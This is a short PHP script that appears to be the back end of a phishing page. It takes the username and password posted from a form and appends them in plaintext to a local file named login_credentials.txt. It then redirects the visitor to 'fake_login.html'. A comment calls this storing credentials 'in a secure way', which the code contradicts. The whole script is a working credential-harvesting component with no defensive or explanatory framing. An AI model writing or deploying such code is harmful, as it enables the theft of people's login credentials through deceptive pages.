<?php
// Check if the form has been submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get the username and password from the form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Store the username and password in a secure way (e.g., database, file, etc.)
    // For demonstration purposes, let's just log the data to a file
    $log_file = 'login_credentials.txt';
    $log_data = "Username: $username\nPassword: $password\n\n";
    file_put_contents($log_file, $log_data, FILE_APPEND);

    // Redirect the user back to the fake login page
    header('Location: fake_login.html');
    exit;
}
?>